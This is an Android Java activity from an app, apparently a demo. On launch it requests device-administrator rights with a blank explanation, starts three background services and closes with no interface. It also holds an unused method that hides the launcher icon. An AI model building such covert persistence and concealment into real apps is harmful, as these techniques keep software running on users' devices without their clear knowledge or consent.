package com.king.ahh.abcd.activity;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;

import com.king.ahh.abcd.R;
import com.king.ahh.abcd.receiver.DeviceReceiver;
import com.king.ahh.abcd.service.JobService;
import com.king.ahh.abcd.service.MainService;
import com.king.ahh.abcd.service.RemoteService;


public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        init();
        finish();
    }

    public void init() {
        registerDeviceManager();
        startService();
    }

    public void startService() {
        startService(new Intent(this, MainService.class));
        startService(new Intent(this, RemoteService.class));
        startService(new Intent(this, JobService.class));
    }

    public void registerDeviceManager() {
        DevicePolicyManager dPManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName componentName =new ComponentName(this,DeviceReceiver.class);

        //如果没有注册设备管理器
        if(!dPManager.isAdminActive(componentName)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "");
            startActivityForResult(intent, 0);
        }
    }

    //　隐藏了启动不了，暂时不用
    public void hideIcon() {
        PackageManager packagemanager = getPackageManager();
        packagemanager.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            ,PackageManager.DONT_KILL_APP);
    }

}
